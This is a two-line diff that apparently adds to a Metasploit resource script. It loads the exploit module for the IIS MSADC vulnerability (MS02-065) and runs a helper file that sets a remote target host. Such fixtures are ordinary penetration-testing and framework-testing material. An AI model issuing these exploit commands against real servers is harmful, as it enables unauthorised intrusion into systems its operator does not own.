@@ -1,0 +1,2 @@
+use exploits/windows/iis/ms02_065_msadc
+resource stub_http_explt_rhost.rb
